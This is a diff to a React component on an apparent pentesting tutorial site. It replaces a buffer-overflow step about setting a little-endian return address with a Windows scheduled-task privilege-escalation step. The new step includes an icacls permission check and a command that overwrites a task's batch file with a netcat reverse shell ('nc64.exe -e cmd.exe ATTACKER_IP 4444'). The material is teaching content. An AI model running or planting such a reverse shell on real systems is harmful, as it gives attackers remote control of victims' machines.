@@ -8,13 +8,12 @@ import {
 import Link from "next/link";
 import SyntaxHighlighter from "react-syntax-highlighter";
 import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
-import Image from "next/image";
 
 interface IProps {
   title: string;
 }
 
-const BufferOverflowStep10 = ({ title }: IProps) => {
+const ScheduledTasks = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -34,33 +33,27 @@ const BufferOverflowStep10 = ({ title }: IProps) => {
               color: "primary.main",
             }}
           >
+            <Typography variant="h6">Description</Typography>
             <Typography>
-              Create a 5-exploit.py script by copying 4-badchars.py. Choose one
-              of the addresses from the result and put it in the `retn` value in
-              the exploit script. Note: You will need to write the address
-              backwards since the system is little endian.
+              Task Scheduler is a job scheduler in Windows that launches
+              computer programs or scripts at pre-defined times or after
+              specified time intervals. Looking into scheduled tasks on the
+              target system, you may see a scheduled task that either lost its
+              binary or it's using a binary you can modify.
             </Typography>
             <Box sx={{ m: 4 }} />
+            <Typography variant="h6">Check Task Permissions</Typography>
             <Typography>
-              Address:{" "}
-              <Typography className="highlight" display="inline">
-                0x625011af
-              </Typography>
-              {"-->"}
-              <Typography className="highlight" display="inline">
-                \x62\x50\x11\xaf
-              </Typography>
-            </Typography>
-            <Typography>
-              retn:{" "}
-              <Typography className="highlight" display="inline">
-                \xaf\x11\x50\x62
-              </Typography>
+              <SyntaxHighlighter className="syntax" language="powershell">
+                {"icacls c:\\tasks\\schtask.bat"}
+              </SyntaxHighlighter>
             </Typography>
             <Box sx={{ m: 4 }} />
-            <Typography>Example</Typography>
-            <SyntaxHighlighter className="syntax" language="bash">
-              {'retn = "\\xaf\\x11\\x50\\x62"'}
+            <Typography variant="h6">Exploiting Task</Typography>
+            <SyntaxHighlighter className="syntax" language="powershell">
+              {
+                "echo c:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\\tasks\\schtask.bat"
+              }
             </SyntaxHighlighter>
           </Typography>
         </AccordionDetails>
@@ -69,4 +62,4 @@ const BufferOverflowStep10 = ({ title }: IProps) => {
   );
 };
 
-export default BufferOverflowStep10;
+export default ScheduledTasks;
